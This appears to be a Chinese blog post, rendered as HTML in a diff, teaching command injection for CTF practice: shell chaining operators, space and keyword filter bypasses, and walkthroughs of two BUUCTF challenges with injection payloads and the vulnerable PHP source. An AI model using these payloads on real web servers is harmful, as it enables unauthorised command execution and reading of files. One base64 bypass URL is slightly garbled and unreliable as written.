@@ -1,0 +1,90 @@
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h1 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h1><h1 id="windows下连接两条命令"><a href="#windows下连接两条命令" class="headerlink" title="windows下连接两条命令"></a>windows下连接两条命令</h1><p>|  直接执行后面的语句，如ping<br><a href="http://www.baidu.com|whoami">www.baidu.com|whoami</a></p>
+<p>||  如果前面的语句执行出错，则执行后面的。如ping<br>2||whoami</p>
+<p>&amp;  前面的语句可真可假。如ping<br>2&amp;whoami</p>
+<p>&amp;&amp;  前面的语句为真时，才执行后面的语句。如ping<br><a href="http://www.baidu.com/">www.baidu.com</a> &amp;&amp; whoami</p>
+<h1 id="Linux下连接两条命令"><a href="#Linux下连接两条命令" class="headerlink" title="Linux下连接两条命令"></a>Linux下连接两条命令</h1><p>|  管道符，直接执行后面的语句，如ping<br>-c 4 127.0.0.1 | whoami</p>
+<p>||  如果前面的语句执行出错，则执行后面的。如ping<br>-c 4 2 || whoami</p>
+<p>;  执行完前面的，直接执行后面的；如ping<br>-c 4 127.0.0.1; whoami</p>
+<p>&amp;&amp;  前面的语句为真时，才执行后面的语句。如ping<br>-c 4 127.0.0.1 &amp;&amp; whoami</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>buuctf: [ACTF2020 新生赛]Exec</p>
+<p><img src="/assets/image-20230611125831-wyd811s.png" alt="image.png"></p>
+<p><img src="/assets/image-20230611130159-pejc8lx.png" alt="image.png"></p>
+<p>输入123| ls，查看一下当前目录下的文件。</p>
+<p><img src="/assets/image-20230611130301-80s6si2.png" alt="image.png"></p>
+<p>只有一个index.php文件，我们再查看一下根目录下的文件。</p>
+<pre><code class="bash">123 | ls /
+</code></pre>
+<p><img src="/assets/image-20230611130359-yoc17e5.png" alt="image.png"></p>
+<p>利用cat命令查看flag中的内容。</p>
+<pre><code class="bash">123 | cat /flag
+</code></pre>
+<p><img src="/assets/image-20230611130535-e51xqpj.png" alt="image.png"></p>
+<h1 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h1><pre><code class="bash">cat$IFS$1flag  //$1改成$加其他数字貌似都行
+{cat,flag}
+cat&lt;flag
+cat&lt;&gt;flag
+${IFS}
+%20 
+%09 
+</code></pre>
+<h1 id="字符绕过"><a href="#字符绕过" class="headerlink" title="字符绕过"></a>字符绕过</h1><p>变量拼接</p>
+<p><img src="/assets/image-20230611133442-8lhlnrs.png" alt="image.png"></p>
+<p>反引号</p>
+<p><img src="/assets/image-20230611142830-4e3mxuo.png" alt="image.png"></p>
+<p>反斜杠</p>
+<p><img src="/assets/image-20230611143949-1ti3kru.png" alt="image.png"></p>
+<p>引号</p>
+<p><img src="/assets/image-20230611144924-yo0kp30.png" alt="image.png"></p>
+<p>编码绕过</p>
+<p>base64编码cat flag</p>
+<p><img src="/assets/image-20230611145308-1izstw5.png" alt="image.png"></p>
+<h1 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h1><h2 id="buuctf-GXYCTF2019-PingPing-Ping"><a href="#buuctf-GXYCTF2019-PingPing-Ping" class="headerlink" title="buuctf:  [GXYCTF2019]PingPing Ping"></a>buuctf:  [GXYCTF2019]PingPing Ping</h2><p><img src="/assets/image-20230611150842-yukxdr4.png" alt="image.png"></p>
+<p><img src="/assets/image-20230611150853-75xulfj.png" alt="image.png"></p>
+<p>这个题目的标题是pingping盲猜是关于命令执行的题目.</p>
+<p>给ip参数传参：&#x2F;?ip&#x3D;127.0.0.1;ls</p>
+<p><img src="/assets/image-20230611151223-ir4jtg6.png" alt="image.png"></p>
+<p>发现同级目录下的两个文件，我们输入?ip&#x3D;127.0.0.1;cat flag.php.</p>
+<p><img src="/assets/image-20230611151427-u1i1cfo.png" alt="image.png"></p>
+<p>并未执行成功，猜测可能是把空格过滤掉了。我们替换空格。（例如:<code>$IFS$</code>1 ）</p>
+<p><img src="/assets/image-20230611151620-l2v4euk.png" alt="image.png"></p>
+<p>发现仍未执行成功，可能将flag字符过滤掉了，但具体怎样过滤的我们还不确定，我们转换思路，查看index.php的内容。</p>
+<p><img src="/assets/image-20230611151733-c5yysqr.png" alt="image.png"></p>
+<p>成功查看到index的内容。</p>
+<p>这段代码是一个PHP脚本，看起来是一个简单的IP地址的ping测试。让我逐行解释其含义：<br><strong>&#x2F;?ip&#x3D;</strong><br>这行代码是一个URL路径，表示在根目录下的ip参数。也就是说，该脚本期望通过GET请求将IP地址作为参数传递给它。</p>
+<pre><code class="php">|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)
+这行代码使用正则表达式检查IP地址参数是否包含一些特殊字符。如果匹配到这些特殊字符，将会执行下面的代码块。
+</code></pre>
+<pre><code class="php">echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);
+die(&quot;fxck your symbol!&quot;);
+</code></pre>
+<p>这段代码使用正则表达式检查IP地址参数中是否包含一些特殊符号，如&amp;、&#x2F;、?、*、&lt;等。如果匹配到这些符号，将输出”fxck your symbol!”并终止脚本执行。</p>
+<pre><code class="php">else if(preg_match(&quot;/ /&quot;, $ip)){
+    die(&quot;fxck your space!&quot;);
+}
+</code></pre>
+<p>这段代码检查IP地址参数是否包含空格。如果包含空格，将输出”fxck your space!”并终止脚本执行。</p>
+<pre><code class="php">else if(preg_match(&quot;/bash/&quot;, $ip)){
+    die(&quot;fxck your bash!&quot;);
+}
+</code></pre>
+<p>这段代码检查IP地址参数是否包含”bash”字符串。如果包含，将输出”fxck your bash!”并终止脚本执行。</p>
+<pre><code class="php">else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){
+    die(&quot;fxck your flag!&quot;);
+}
+</code></pre>
+<p>这段代码使用正则表达式检查IP地址参数是否包含”f”, “l”, “a”, “g”字符序列（无论字符之间是否有其他字符）。如果匹配到这个字符序列，将输出”fxck your flag!”并终止脚本执行。</p>
+<pre><code class="php">$a = shell_exec(&quot;ping -c 4 &quot;.$ip);
+echo &quot;
+&quot;;
+print_r($a);
+</code></pre>
+<p>这段代码使用shell_exec函数执行一个ping命令，向指定的IP地址发送4个回声请求。然后将ping命令的输出打印出来。&#96;</p>
+<p>总结来说，这段代码对传入的IP地址参数进行了一系列的检查，包括特殊字符、空格、”bash”字符串和特定字符序列。如果检查失败，将输出相应的错误信息并终止脚本执行。如果检查通过，将执行ping命令并打印其输出。</p>
+<p>base64编码绕过：<code>http://e7d31689-f496-4351-93df-bced5d941928.node4.buuoj.cn:81/?ip=127.0.0.1;echo1Y2F0IGZsYWcucGhw|base641-d|sh$IFS$$IFS$</code></p>
+<p>我们可以利用变量拼接字符绕过，以达到执行cat flag.php的目的。</p>
+<p><img src="/assets/image-20230611152448-6lijcbr.png" alt="image.png"></p>
+<p>查看源代码：</p>
+<p><img src="/assets/image-20230611152617-4f1gtlf.png" alt="image.png"></p>
+<p>得到flag。</p>
+<p>经验：</p>
+<p>多次尝试不同方式的字符绕过，以及连接符（比如：|或;或者&amp;&amp;）。</p>
